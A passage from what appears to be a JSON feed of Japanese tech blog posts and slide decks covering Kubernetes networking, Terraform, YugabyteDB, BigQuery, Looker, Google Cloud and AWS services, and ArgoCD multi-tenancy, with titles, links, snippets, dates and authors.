\\rhttps://github.com/torvalds/linux/blob/master/Documentation/networking/nf_conntrack-sysctl.rst \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://linuxjm.osdn.jp/html/iptables/man8/iptables-extensions.8.html \\rhttps://man.archlinux.org/man/conntrack.8.en \\rhttps://nomeu.net/8380/ \\rhttps://knowledge.sakura.ad.jp/4048/ \\rhttps://docs.openshift.com/container-platform/4.10/rest_api/network_apis/service-v1.html \\rhttps://stackoverflow.com/questions/75835169/kubernetes-loadbalancer-how-does-healthchecknodeport-work \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/#preserving-the-client-source-ip \\rhttps://kubernetes.io/docs/concepts/services-networking/service-traffic-policy/ \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/ \\rhttps://hyoublog.com/2020/05/20/kubernetes-externalip-service/ \\rhttps://qiita.com/dingtianhongjie/items/8f3c320c4eb5cf25d9de \\rhttps://milestone-of-se.nesuke.com/nw-basic/as-nw-engineer/loopback-address-interface/ \\rhttps://kubernetes.io/docs/reference/networking/virtual-ips/ \\rhttps://kubernetes.io/docs/concepts/services-networking/service/ \\rhttps://kubernetes.io/ja/docs/concepts/services-networking/connect-applications-service/ \\rhttps://knowledge.sakura.ad.jp/22636/ \\rhttps://netfilter.org/index.html \\rhttps://madomadox.hatenablog.com/entry/2021/01/03/190730 \\rhttps://qiita.com/bashaway/items/e405d59d92670fbc5341 \\rhttps://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://eng-entrance.com/linux-firewall \\r\\r\\r画像引用元:\\rhttps://github.com/kubernetes/community/tree/master/icons \\rhttps://github.com/kubernetes/kubernetes/tree/master/logo \\rhttps://github.com/cncf/artwork/tree/master/projects/kubernetes \\rhttps://github.com/kubernetes/kubeadm/tree/main/logos","isoDate":"2023-11-09T05:00:00.000Z","dateMiliSeconds":1699506000000,"authorName":"bells17","authorId":"bells17"},{"title":"Amazon ECSイベントをCloudWatch Logsへ収集する","link":"https://zenn.dev/yuu0w0yuu/articles/df3a9fdef609e2","contentSnippet":"この記事は、3-shake Advent Calendar 2023 1日目のエントリ記事です。 きっかけECSは、Container Insightsを有効化することでクラスタやサービスといった各レイヤのパフォーマンスメトリクスをCloudWatchに収集できる。一方で、以下のようなケースにおいて一定の仮説を導くためには、このメトリクスだけではやや不足感があるため、発生したイベントやその結果を別の方式で監視したくなった。メトリクスがスパイクしたタイミングで何が起きていたか？デプロイを実行したが結果はどうだったか？デプロイが失敗したが原因は何か？などなど・・調べてみ...","isoDate":"2023-11-02T08:33:22.000Z","dateMiliSeconds":1698914002000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】\\"Findy Terraform 活用大全 - IaCの今\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/10/25/550144","contentSnippet":"発表スライドから得られる知識イベント名発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Terraformのtfstateの分割パターンtfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法みんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『 tfstate の分割パターンとディレクトリ構成への適用』ていうテーマで、 Findy Terraform 活用大全 - IaCの今 に登壇したぞ！https://findy.connpass.com/event/298972/『Terraform活用大全 - IaCの今。』の登壇資料です!!tfstateを分割してみんなで最高になろう✌\uD83C\uDFFB#Terraform_findyhttps://t.co/NteGvKdMEE— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) October 25, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-10-25T03:00:00.000Z","dateMiliSeconds":1698202800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83E\uDDD1‍\uD83D\uDE80 tfstate の分割パターンとディレクトリ構成への適用","link":"https://speakerdeck.com/hiroki_hasegawa/tfstate-nofen-ge-hatantoteirekutorigou-cheng-henoshi-yong","contentSnippet":"『Terraform活用大全 - IaCの今』の登壇資料です\\r\\r\\r・Terraformのtfstateの分割パターン\\r・tfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法\\r\\rを紹介しました\\r\\rスライドでは少ししか分割パターンを紹介できませんでしたので、ぜひ元記事 (tfstateファイルの分割パターンとディレクトリ構成への適用) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1717030862452384047","isoDate":"2023-10-24T04:00:00.000Z","dateMiliSeconds":1698120000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day9","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/9_core_functions_high_availability","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Read I/O pathを読みました。今回はArchitecture > Core functions > High Availabilityを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。High availabilityYugabyteDBは一貫性と分断耐性を兼ね備えたデータベースであると同時にリーダーの障害時に新しいリーダーとしてフェイルオーバー出来るアクティブレプリカを持つことで高可用性(HA)を達成している。もしノードに障害が発生した場合、そのノード上で動作するYB-TServerとYB-Masterの停止を引き起こす。YB-TServer failureYB-TServerはYSQLレイヤとアクティブなIOを提供するピアーリーダータブレットを含むタブレットをホストする。YSQレイヤとタブレットピアーフォロワーとタブレットピアーリーダーで発生した障害はそれぞれ特別な方法であつかわれる。YQL failureアプリケーションの視点からみればYQLはステートレスである。そのためクライアントが発行したリクエストは単純に他ノードのYQLにリクエストが送信される。スマートクライアントを利用している場合、スマートクライアントは理想的なYB-TServerの場所をタブレットが所有するキーから検索し、リクエストを直接そのノードに転送する。Tablet peer follower failureタブレットピアーフォロワーはクリティカルパスではない。この障害はユーザーリクエストへの可用性に影響しない。Tablet peer leader failureタブレットピアーリーダーの障害は数秒以内にRaftレベルのリーダー選出を自動的にトリガーし、他のYB-TServerに配置されているタブレットピアーが新しいリーダーとして選出される。タブレットピアリーダーに障害が発生した場合、可用性が損なわている時間は約3秒(ハードビートの感覚がデフォルトの500msの場合)である。YB-Master failureYB-Masterは通常のIOオペレーションではクリティカルパスでは無いため、ユニバースを動作させるのに影響は無い。しかしYB-Masterは異るノードで動作するピアーのRaftグループの一部であるため。このピアーのうちの一つがアクティブなマスターで残りがアクティブスタンバイである。YB-Masterのリーダーであるアクティブマスターに障害が発生した場合、ピアーはリーダーの障害を検知し、新なアクティブマスターであるYB-Masterのリーダーを障害時に数秒以内で再選出する。","isoDate":"2023-10-21T15:12:37.000Z","dateMiliSeconds":1697901157000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Google Application Integrationについて","link":"https://zenn.dev/nedoko_dok0dko/articles/365af68bb280e7","contentSnippet":"whatGoogle Cloudの「Application Integration」というサービスについて軽く調べたことをまとめたログ関連してiPaasについても調べたことを記載する Application Integrationとはhttps://cloud.google.com/application-integration?hl=jaGoogle Cloudが提供するIntegration Platform as a Service（iPaaS）ソリューションビジュアルエディタを利用することによって、以下がノーコードで行えるイベントによるトリガーの...","isoDate":"2023-10-18T09:20:05.000Z","dateMiliSeconds":1697620805000,"authorName":"seno","authorId":"seno"},{"title":"コンテナ \xd7 セキュリティ \xd7 AWS","link":"https://speakerdeck.com/kyohmizu/kontena-x-sekiyuritei-x-aws","contentSnippet":"「JAWS-UG コンテナ支部 \xd7 JAWS-UG 千葉支部 #1 今知りたいコンテナセキュリティ」の資料です。\\rhttps://jawsug-container.connpass.com/event/295110/","isoDate":"2023-10-16T04:00:00.000Z","dateMiliSeconds":1697428800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Cloud Asset Inventoryとは","link":"https://zenn.dev/nedoko_dok0dko/articles/e80d73d4f28a79","contentSnippet":"whatGoogle Cloud のCloud Asset Inventoryについて調べてわかったことの個人まとめ Cloud Asset Inventoryとはhttps://cloud.google.com/asset-inventory/docs/overview?hl=jaCloud Asset Inventory は、時系列データベースに基づいてインベントリ サービスを提供します。このデータベースは、Google Cloud のアセット メタデータの 35 日間分の履歴を保持します。過去 35 日間変更がない既存のアセットの場合、Cloud Asset ...","isoDate":"2023-10-13T10:27:12.000Z","dateMiliSeconds":1697192832000,"authorName":"seno","authorId":"seno"},{"title":"kube-controller-manager入門","link":"https://speakerdeck.com/bells17/kube-controller-managerru-men","contentSnippet":"SRETT #7 で発表した資料です。\\rhttps://3-shake.connpass.com/event/293432/\\r\\r発表のライブ配信はこちら。\\rhttps://www.youtube.com/watch?v=h1VxlvF9bls\\r\\rzennのスクラップ:\\rhttps://zenn.dev/bells17/scraps/592a02b3bc1ff3\\r\\rスライドで紹介した参考リンク集:\\r- https://github.com/kubernetes/kubernetes/tree/v1.28.2","isoDate":"2023-10-12T04:00:00.000Z","dateMiliSeconds":1697083200000,"authorName":"bells17","authorId":"bells17"},{"title":"DietPi で DNLA サーバー","link":"https://blog.1q77.com/2023/09/minidlna-on-dietpi/","contentSnippet":"Raspberry Pi 4 を買った週に Raspberry Pi 5 が発表されてちょっと悔しいところですが Windows XP 時代から OS を更新しながら使っていた古いデスクトップPCを処分したのでそこで使っていた HDD をラズパイにつないで Samba で NAS としてアクセス可能にしてみました。そこには昔ハンディカムで撮影した動画なんかも沢山保存されていたのでテレビでそれを見れるように DLNA のメディアサーバーすることにしました。","isoDate":"2023-09-30T08:33:09.000Z","dateMiliSeconds":1696062789000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"EventBridge Scheduler からの Lambda 関数起動に Lambda Permission は不要","link":"https://zenn.dev/toshikish/articles/743f69389aa99c","contentSnippet":"AWS Lambda 関数の他サービスからの呼び出しAWS Lambda 関数にはリソースベースポリシーを割り当てることができます。関数を他のサービスから呼び出すとき，通常はリソースベースポリシーにそのサービスからの実行を許可するポリシーを追加する必要があります。例えば，Amazon SNS からイベント駆動で呼び出す場合は，以下のように add-permission コマンドを実行することでポリシーを追加することができます。aws lambda add-permission --function-name example-function \\\\--action lambda...","isoDate":"2023-09-22T10:16:34.000Z","dateMiliSeconds":1695377794000,"authorName":"toshikish","authorId":"toshikish"},{"title":"WSL 2 で外部ストレージをマウント","link":"https://blog.1q77.com/2023/09/wsl2-mount-volume/","contentSnippet":"Laptop を Linux で使用していた時の遺産を WSL 環境でも使おうと XFS でフォーマットされた USB 接続の HDD をマウントする方法がないかなと思って調べたメモ。Microsoft のドキュメントにありました。","isoDate":"2023-09-21T14:08:28.000Z","dateMiliSeconds":1695305308000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"IPA試験 合格体験記/qualification-story","link":"https://speakerdeck.com/moz_sec_/qualification-story","contentSnippet":"","isoDate":"2023-09-15T04:00:00.000Z","dateMiliSeconds":1694750400000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"BigQueryの行列レベルのアクセス制御について","link":"https://zenn.dev/nedoko_dok0dko/articles/bc6a413eb623c7","contentSnippet":"whatBigQueryにおける「行列レベル」のアクセス制御について調べたことをまとめる そもそも: 行・列単位に対してのアクセス制御は可能なのか?A. できるそれぞれ記載していく 列単位https://cloud.google.com/bigquery/docs/column-level-security-intro?hl=ja列に対して事前定義したポリシータグと呼ばれるものを付与することで、特定のアカウントやグループだけが列にアクセスできる。アクセスポリシーはSQLを実行する際に確認され、許可されていないメンバーからのクエリはAccess Denitedと...","isoDate":"2023-09-14T11:46:25.000Z","dateMiliSeconds":1694691985000,"authorName":"seno","authorId":"seno"},{"title":"Cloud Deployを使ったCloud Runのリリース","link":"https://zenn.dev/satohjohn/articles/7e6a70edc8f36e","contentSnippet":"概要Cloud RunのリリースにCloud Deployを使ってみます。 そもそもCloud Deployとはhttps://cloud.google.com/deploy?hl=jaGKE、Cloud Runのリリースを管理できるサービスになります。リリースフローを記載したパイプラインの定義を作成し、パイプラインを作成したら、フローを管理できるようになります。各フローでは基本内部でskaffoldを通して、Cloud Buildが実行される形です。Cloud Deployを使うと以下のような、リリースフローになるかと思います。Cloud BuildでImageを...","isoDate":"2023-09-13T05:47:13.000Z","dateMiliSeconds":1694584033000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetesソースコードリーディング入門","link":"https://speakerdeck.com/bells17/kubernetessosukotoriteinkuru-men","contentSnippet":"Kubernetes Novice Tokyo #27 で発表した資料です。\\rhttps://k8s-novice-jp.connpass.com/event/293144/\\r\\r発表のライブ配信はこちら。\\rTODO\\r\\rスライドで紹介した参考リンク集:\\rhttps://bells17.medium.com/things-you-should-know-about-reading-kubernetes-codes-933b0ee6181d \\rhttps://www.amazon.co.jp/dp/4297104385/\\rhttps://www.amazon.co.jp/dp/4297118378/ \\rhttps://go.dev/tour/welcome/1 \\rhttps://gopherdojo.org/studyroom/ \\rhttps://www.amazon.co.jp/dp/4621300253/ \\rhttps://speakerdeck.com/bells17/kubelet-and-containers \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp \\rhttps://speakerdeck.com/sanposhiho/zi-zuo-sitexue-bukubernetes-schedulerru-men \\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive \\rhttps://speakerdeck.com/masayaaoyama/infrastudy2-k8s \\rhttps://github.com/kubernetes/client-go/tree/master/examples/workqueue \\rhttps://github.com/kubernetes/sample-controller/blob/master/controller.go \\rhttps://github.com/kubernetes-sigs/kubebuilder \\rhttps://speakerdeck.com/bells17/kubebuilder-introduction \\rhttps://zoetrope.github.io/kubebuilder-training/ \\rhttps://github.com/cybozu-go \\rhttps://www.youtube.com/watch?v=yqB_le-N6EE \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-instrumentation/1602-structured-logging/README.md \\rhttps://github.com/kubernetes/enhancements/issues/1602 \\rhttps://github.com/kubernetes/klog/issues/125 \\rhttps://github.com/kubernetes/klog/pull/126 \\rhttps://github.com/kubernetes-csi \\rhttps://kubernetes-csi.github.io/docs/drivers.html \\rhttps://speakerdeck.com/bells17/introduction-to-csi \\rhttps://github.com/kubernetes/kubeadm \\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init \\rhttps://github.com/kubernetes-sigs/metrics-server \\rhttps://speakerdeck.com/bells17/metrics-server \\rhttps://speakerdeck.com/bells17/accurate-introduction \\rhttps://github.com/cybozu-go/accurate \\rhttps://slack.k8s.io/ \\rhttps://www.youtube.com/watch?v=Ayo5w-CSmP0 \\rhttps://github.com/kubernetes/community","isoDate":"2023-09-12T04:00:00.000Z","dateMiliSeconds":1694491200000,"authorName":"bells17","authorId":"bells17"},{"title":"GitHub ActionsでWorkload Identityでの認証を入れてGoogle CloudのAPIを叩く","link":"https://zenn.dev/satohjohn/articles/1645be8e83eab6","contentSnippet":"概要正直難しいと思ってたのですが、資料を読んでいくと表面上、実装は難しくありませんでした。GitHub ActionsとGoogle Cloudを連携する場合、json管理とかしなくても済むし、基本的にやっておいて損はないと思います。ユースケースとしては、例えば、GitHub Actionsで実行した結果(report)をGoogle Cloud Storageにデータを送りたいなどの際に使えると思います。Identity Poolに対して、providerは複数作成できるため、いろんな GitHub Actionsから利用されるようなパターンでも、provider:scri...","isoDate":"2023-09-11T14:17:35.000Z","dateMiliSeconds":1694441855000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"BigQueryのオンデマンド料金におけるコスト管理方法についてメモ","link":"https://zenn.dev/nedoko_dok0dko/articles/f0da04c4a70ea6","contentSnippet":"whatBigQueryにおけるコスト管理方法について、公式ドキュメントを元にメモしたログ今回はオンデマンド料金について記載のため、定額料金(BigQuery Editions)に関しては記載しない 高額請求が来てしまうパターンとはよく見かける/耳にするのは以下のような場合(あくまで一例)大量にデータをスキャンするクエリを実行するselect * 系のクエリを投げる(Table Patitionを利用したテーブルの場合)partitionで指定しないでクエリを投げる料金がかかるクエリをバッチなど利用して連続で実行してしまうTable Patition...","isoDate":"2023-09-11T01:56:24.000Z","dateMiliSeconds":1694397384000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day8","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/8_core_functions_read_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Write I/O pathを読みました。今回はArchitecture > Core functions > Read I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Read I/O pathI/O Pathはタブレットリーダーが特定されリード処理を実行する単一キーの例で説明することが出来る。Tablet leader identificationユーザーが発行したYQLクエリレイヤに作用するリードリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザリクエストはYQLレイヤで内部キーに変換され、YQLレイヤがタブレットとそれをホストするYB-TServerを発見するのに利用される。YQLレイヤはこれをYB-MasterにたしてRPC呼び出しを実行するために行なう。またそのレスポンスは将来の利用のためにキャッシュされる。その後YQLレイヤはリーダータブレットピアーをホストするYB-TServerに対してリード処理を行なう。このリード処理は内部キーを保持するタブレットのRaftグループのリーダーによって処理される。このリードリクエストを処理するRaftグループのリーダーはDocDBから読み込みを実行し、その結果をユーザーに戻す。Write I/O Pathで説明した通り、YugabyteDBのスマートクライアントではアプリケーションのリクエストを直接適切なYB-TServerに送信することが出来るため、余計なネットワークホップやマスターへのアクセスを省略することが出来る。Read operation performed by tablet leaderkという値をKというプライマリキー行に持つテーブルT1からデータを取得するケースについて考える。またテーブルT1はキー行Kと値行Vを持つものとする。1下記の画像はリード処理について説明している。YugabyteDBはデフォルトでは強整合性の読み取りを採用している。リードクエリはさらに複雑になることもある。YQLクエリレイヤーは式やビルトイン関数、算術演算を含むクエリを処理するfully-optimized2されたクエリエンジンを持っている。SELECT K,V from T1 where K = \'k\'ということ↩↩","isoDate":"2023-09-06T18:37:55.000Z","dateMiliSeconds":1694025475000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"LookMLとは","link":"https://zenn.dev/nedoko_dok0dko/articles/18a4a04b98dcb8","contentSnippet":"これは何？Looker内にある機能である「LookML」について調べたことをまとめた個人的備忘録。 LookMLとはLookMLの紹介 \xa0|\xa0 Looker \xa0|\xa0 Google CloudLookML は、Looker Modeling Language の略です。セマンティックデータモデルを作成するためにLookerで使用される言語です。LookMLを使用して、SQLデータベース内のディメンション、集計、計算、およびデータの関係を記述できます。LookMLは「Looker上で利用できる独自の言語」のことをさす　別にMLや機械学習は関係ないLookerは、Lo...","isoDate":"2023-09-05T10:46:35.000Z","dateMiliSeconds":1693910795000,"authorName":"seno","authorId":"seno"},{"title":"Nodejs(Nest.js)のアプリケーションのbuildを高速化、slim化してみようの会","link":"https://zenn.dev/satohjohn/articles/c05d29f5d68e0c","contentSnippet":"前提DockerによるNode.jsのインストール(pull)はキャッシュされているものとする.dockerignoreは以下の通りnode_modules.git.gitignore*.mddisttest 最初にまとめ軽く、そんなに依存関係が多くないアプリケーションであればnpmでstaging buildでキャッシュ効かせるぐらいでよいかもRUN --mount=type=cache,target= は効果がありそうである (https://zenn.dev/kou64yama/articles/powerful-docker-build-cache...","isoDate":"2023-09-02T10:02:16.000Z","dateMiliSeconds":1693648936000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Lookerのユーザー権限について","link":"https://zenn.dev/nedoko_dok0dko/articles/160cb146e72740","contentSnippet":"これは何Lookerのユーザー権限一覧を個人的にまとめたものhttps://cloud.google.com/looker/docs/admin-panel-users-roles?hl=ja#default_permission_sets ユーザー権限一覧Admin:Developer、Viewer、Standard権限に加え、データソースへの接続やユーザー管理の権限を持つ現時点で確認できる、Adminでしかできない機能については以下データソース(BigQuery等)への接続設定ユーザーの追加・削除・権限の変更ユーザー・グループ単位のフォルダの公開・非公...","isoDate":"2023-08-31T17:22:40.000Z","dateMiliSeconds":1693502560000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day7","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/7_core_functions_write_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Table Creationを読みました。今回はArchitecture > Core functions > Write I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Write I/O pathWrite I/O pathはYQLレイヤーで処理され、タブレットリーダーによってレプリケーションの準備が行なわれるシングルキーでの書き込みとして例示することが出来る。アトミックなアップデートを共なう複数キーでの分散トランザクションなど複雑なケースについては分散トランザクションに記載する。Write operation processing by YQL layerユーザーが発行したYQLクエリレイヤに作用するライトリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザーリクエストはYQLレイヤで内部キーに変換される。シャーディングで説明するように、それぞれのキーは一つのタブレットが所有する。どのタブレットがキーを所有するか特定するために、YQLレイヤはYB-MasterにRPC1呼び出しを実行する。そのレスポンスは将来の利用のためにキャッシュされる。YugabyteDBはタブレットの場所をキャッシュし直接参照することでネットワークホップを減らすことで、YQLレイヤが直接適切なYB-TServerにホストされるタブレットリーダーにリクエストを送信することが出来るスマートクライアントを持つ。YQLレイヤがローカルノードにタブレットリーダーを見つけた場合、RPCはローカルファンクションコールになりリクエストをシリアライズとデシリアライズしてネットワーク越しに送信する時間を節約することが出来る。その後YQLレイヤはタブレットリーダーをホストするYB-TServerへの書き込みを発行する。この書き込みはキーを所有するRaftグループのタブレットリーダーによって処理される。Preparation of the operation for replication by tablet leader下記の図はタブレットリーダーがレプリケーションを実行する処理を説明している。タブレットのRaft Groupリーダーは以下の処理を実行する。現在実行されている処理が現在のスキーマに対応しているかを判別するキーに対してローカルin-memoryロックマネージャーを利用してロックを取得する。このロック機構はフォロワーには存在しない必要であればデータを読み込む(read-modify-writeや条件付きアップデート命令など)DocDBに書き込まれる変更のバッチを準備する。この書き込みバッチは殆ど最終的にRocksDBに書き込まれるKey-Valueペアに近く、それぞれのキーの末尾に最終的なhybrid timestampが添えられていないだけであるRaft replication of the write operation書き込みのRaftレプリケーション処理の流れは以下のように説明することが出来る。リーダーがバッチをRaft logにアペンドし、書き込みのためのhybrid timestampを選択するRaftを利用しデータをピアーに複製する成功したRaft replicationのデータをローカルのDocDBに反映するユーザーに成功を返すフォロワータブレットはRaftを利用したデータの複製を受けつけ、コミットされた事が分ったタイミングでその複製をローカルのDocDBに反映する。リーダーは以下のようにコミットポイントに於ける後続のRPCリクエストの進行を進める。書き込みバッチを含むRaftエントリーは過半数以上のタブレットRaft Groupピアーに複製されるRaftのサブシステムから\\"Replication Successful\\"のコールバックを取得したあと、リーダーはローカルのDocDBにバッチの書き込みを適用するリーダーからの次の更新でエントリーがコミットされたことがフォロワーに通知され、フォロワーはそれぞれのRocksDBインスタンスにバッチの書き込みを適用する。Response to the clientInformation Pending2Exampleskとvという値をKという行とVという行をもつテーブルT1に挿入する例について考える3。この例ではユーザーアプリケーションがランダムなYugabyteDBサーバにWriteクエリを送信し、そのサーバがリクエストを適切にルーティングすると仮定して簡略化している。特にYCQLではYugabyteDB Smart Clientを使うことで、余分なネットワークホップを避けることが出来る。↩原文ママ。過去のバージョンでも記載無し↩INSERT INTO T1 (K,V) VALUES(\'k\',\'v\')ということ↩","isoDate":"2023-08-30T16:03:36.000Z","dateMiliSeconds":1693411416000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day6","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/6_core_functions_table_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Universe creationを読みました。今回はArchitecture > Core functions > Table Creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Table CrationYugabyteDBではユーザーにより実行されるテーブルの作成はYB-Masterのリーダーが実行する非同期APIによって管理される。YB-MasterはそのAPIでテーブルのスキーマと障害耐性を高めるために形成するRaftグループに所属するYB-Masterでのテーブル作成に必要な他の情報のレプリケーションが完了した段階でAPIの成功を返す。YB-Masterのリーダーがテーブル作成を実行するときは複数のステップが存在する。ValidationYB-Masterリーダーはテーブルスキーマの検証を行ない、指定された数のタブレットを作成する。これらのタブレットはこの段階ではYB-TServerには割り振られていない。ReplicationYB-MasterリーダーはYB-MasterのRaftグループにテーブルスキーマと新しく作成されたタブレット(この時点ではYB-TServerへの割り当て行なわれていない)の複製を行なう。この処理はYB-Masterリーダに障害が発生してもテーブル作成が成功することを保証する。Acknowledgementテーブル作成処理はYB-Masterリーダーに障害が発生しても処理を継続することが出来るため、この段階で非同期テーブル作成APIは成功を返す。ExecutionYB-Masterリーダーはそれぞれのタブレットをレプリケーションファクターとして指定された数だけYB-TServerに割り当てを行なう。このタブレットピアーの配置は指定された障害耐性を実現でき、またタブレットの割り当てがYB-TServerに均等に行なわれるように実行される。タブレットのYB-TServerへの割り当てはタブレットのレプリカが複数クラウド、リージョン、アヴェイラビリティゾーンをまたいで分散するといった追加の制約を満す必要がある。Continuous monitoringYB-Masterリーダーは全てのタブレットの割り当て処理を監視し、その実行状態と完了をユーザーが実行したAPIコールに対して応答する必要がある。Examplesテーブルが4ノードからなるYugabyteDBUniverseに作成される処理について考える。このときテーブルは16のタブレットと3つのレプリケーションファクターを持つとする。YB-Masterリーダーはスキーマを検証する。また16タブレット(合計48のタブレットピアー)を作成し、Raftを利用して過半数のYB-TServerにテーブルの作成に必要なデータを複製する。作成したタブレットをRaftグループを成すYB-TServerの中の指定された数のYB-TServer割り当て、リーダーの選出を行なう。このタブレットに属するキーに対する全てのリードとライトは、タブレットピアーのリーダーとRaftグループが責任を持つ。タブレットが割り当てられると長期に渡る障害か将来のロードバランシングが発生しYB-Masterにオーナーシップを変更されるまで、割り当て先のYB-TServerが所有する。タブレットリーダーをホストするYB-TServerの内の1台に障害が発生した場合、タブレットのRaftグループはI/Oを処理するために即座にリーダーエレクションを実行する。そのためYB-MasterはI/Oにおけるクリティカルパスになることはない。レプリケーション先となる候補を探す。この複製処理は段階的かつGracefulに実行される。","isoDate":"2023-08-23T14:26:45.000Z","dateMiliSeconds":1692800805000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【ArgoCD\uD83D\uDC19️】KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/08/18/110646","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類マルチテナントパターンをArgoCDで実践する場合にオススメのパターン (★で表現)ArgoCDのNamespacedスコープモードとClusterスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜマルチテナントが必要なのかシングルテナントの場合マルチテナントの場合03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧Clusters as-a-ServiceControl Planes as-a-ServiceNamespaces as-a-Serviceカスタムリソーステナント04. ArgoCDでのテナントパターン実践一覧04-02. Clusters as-a-Service 実践実Clusterテナントオススメしない理由04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★オススメした理由04-04. Namespaces as-a-Service 実践04-05. カスタムリソーステナントの実践AppProjectテナントCLモード vs. NSモード05. CLモードなArgoCDCLモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)オススメしない理由05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)特にオススメした理由AppProjectテナント例の一覧テナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)オススメしなかった理由テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)オススメした理由テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)特にオススメした理由06. どのような誤った操作を防いでくれるのかマニフェストのデプロイ制限マニフェストをデプロイできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合カスタムリソースのReconciliation制限ArgoCD系カスタムリソースをReconciliationできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、熟成アルトバイエルンです。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19のマルチテナント化を担当しました。プロダクトが稼働するKubernetes Clusterが数十個あり、Clusterによっては複数のチームが合計100個以上のマイクロサービスを動かしています。このような大規模なマイクロサービスシステムがいくつもある状況下で、ArgoCDのマルチテナント設計の知見を深められたため、記事で解説しました。書きたいことを全部書いたところ、情報量がエグいことになってしまったため、気になる章だけでも拾って帰っていただけるとハッピーです\uD83D\uDE4FKubernetesのマルチテナントパターン (3章)ArgoCDでのテナントパターン実践一覧 (4章)ArgoCDのClusterスコープモードとNamespacedスコープモード (5章)どのような誤った操作を防いでくれるのか (6章)それでは、もりもり布教していきます\uD83D\uDE1702. 